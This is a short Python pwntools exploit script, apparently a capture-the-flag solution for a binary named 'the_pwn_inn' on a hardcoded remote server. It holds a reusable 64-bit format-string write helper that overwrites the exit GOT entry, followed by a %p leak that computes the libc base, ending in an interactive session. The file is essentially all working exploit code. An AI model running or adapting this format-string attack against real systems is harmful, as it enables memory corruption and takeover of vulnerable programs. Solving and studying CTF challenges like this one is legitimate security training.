from pwn import *

def fsb64(offset, addr, value, b=3):
    payload = ''
    prev = 0

    if value == 0:
        payload += '%{}$ln'.format(offset + 1)
        payload += 'A' * ((8 - len(payload) % 8) % 8)
        payload += p64(addr)
        return payload

    for i in range(b):
        target = (value >> (i * 16)) & 0xffff
        
        if prev < target:
            payload += '%{}c'.format(target - prev)
        elif prev > target:
            payload += '%{}c'.format(0x10000 + target - prev)

        payload += '%xx$hn'
        prev = target

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        idx = payload.find("%xx$hn")
        off = offset + (len(payload) / 8) + i
        payload = payload[:idx] + '%{}$hn'.format(off) + payload[idx+6:]

    payload += 'A' * ((8 - len(payload) % 8) % 8)

    for i in range(b):
        payload += p64(addr + i * 2)
    
    return payload
#p = process("./the_pwn_inn")
p = remote("161.97.176.150", 2626)
elf = ELF("./the_pwn_inn")
libc = elf.libc
if __name__ == "__main__":
    offset = 6
    payload = fsb64(offset, elf.got['exit'], 0x401328) + "%p"
    p.sendline(payload)
    p.sendline("%p %p %p %p %p %p %p %p %p" * 4)
    p.recvuntil("Welcome ")
    p.recvuntil("Welcome ")
    p.recvuntil("Welcome ")
    p.recvuntil("Welcome ")
    (p.recv(15))
    (p.recv(15))
    p.recvuntil("(nil) ")
    p.recv(15)
    _IO_2_1_stdout_ = int(p.recv(15), 16)
    p.success("_IO_2_1_stdout_ : " + hex(_IO_2_1_stdout_))
    libc_base = _IO_2_1_stdout_ - libc.symbols['_IO_2_1_stdout_']
    p.success("libc_base : " + hex(libc_base))
    
    pause()
    p.interactive()
